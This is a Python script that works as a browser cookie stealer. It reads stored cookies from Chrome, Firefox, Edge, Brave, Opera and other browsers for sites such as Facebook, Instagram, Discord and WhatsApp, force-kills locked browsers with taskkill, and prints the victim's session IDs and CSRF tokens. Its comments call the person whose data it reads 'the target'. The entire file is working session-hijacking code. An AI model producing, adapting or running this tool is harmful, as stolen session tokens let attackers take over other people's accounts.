import browser_cookie3
import sqlite3
from os import system
from sys import exit 
import time

# You may add more websites to target by adjusting the list
websites = [
'facebook.com',
'instagram.com',
'twitter.com',
'tiktok.com',
'linkedin.com',
'reddit.com',
'snapchat.com',
'pinterest.com',
'youtube.com',
'tumblr.com',
'threads.net',
'discord.com',
'telegram.org',
'whatsapp.com',
'wechat.com',
'weibo.com',
'vk.com',
'quora.com',
'twitch.tv',
'mastodon.social',
'bereal.com',
'bluesky.social',
'clubhouse.com'
]

# Only supported browsers from the library
browsers = [
"chrome",
"chromium",
"firefox",
"librewolf",
"edge",
"brave",
"opera",
"opera_gx",
"vivaldi"          
]

# Collect all possible web browser's that the target may have for cookies
cookies = {}

looping = True

while looping:
    looping = False
    for i in browsers:
        try:
            browser = getattr(browser_cookie3, i)
            cookies[i] = {}
        except AttributeError:
            print(f"Browser {i} not found... skipping...")
            continue
        for x in websites:
            try:
                cookies[i][x] = browser(domain_name=x)
            except FileNotFoundError:
                print(f"The file is missing?")
                cookies[i][x] = None
            except PermissionError:
                while True:
                    proceed = input(f"Would you like to close the target's browser session '{i}' in order to proceed?:").lower()
                    if proceed == "yes" or proceed == "y":
                        break
                    elif proceed == "no" or proceed == "n":
                        print("Understood, closing the script, try again when the browser is not locked...")
                        time.sleep(3)
                        exit()
                    else:
                        print("Please provide a valid 'Yes' or 'No', (y/n)")
                print(f"Closing {i} to grab cookies...")
                if i == "edge":
                    system(f"taskkill /F /IM msedge.exe")
                elif i == "opera_gx":
                    system(f"taskkill /F /IM opera.exe")
                else:
                    system(f"taskkill /F /IM {i}.exe")
                time.sleep(2)
                looping = True
                cookies = {}
                break
            except (sqlite3.OperationalError, browser_cookie3.BrowserCookieError, OSError) as e:
                 cookies[i][x] = None
            if looping:
                break
        if looping:
            break

# Helper function to get a specific cookie value
def get_cookie_value(cookie_jar, cookie_name):
    for cookie in cookie_jar:
        if cookie.name == cookie_name:
            return cookie.value
    return None  # Cookie not found

# Filter what is needed
for browser_name, sites in cookies.items():
    for site_name, cookie_jar in sites.items():
        if cookie_jar and not isinstance(cookie_jar, type(None)):
            sessionid = get_cookie_value(cookie_jar, "sessionid")
            csrftoken = get_cookie_value(cookie_jar, "csrftoken")
            xsrftoken = get_cookie_value(cookie_jar, "xsrftoken")
            
            print(f"{browser_name} | {site_name} | sessionid: {sessionid} | csrf: {csrftoken} | xsrf: {xsrftoken}")

# Here just incase it's used from GUI so it doesn't close right away after output
input("GUI BUFFER, IGNORE, JUST PRESS ENTER TO CLOSE...")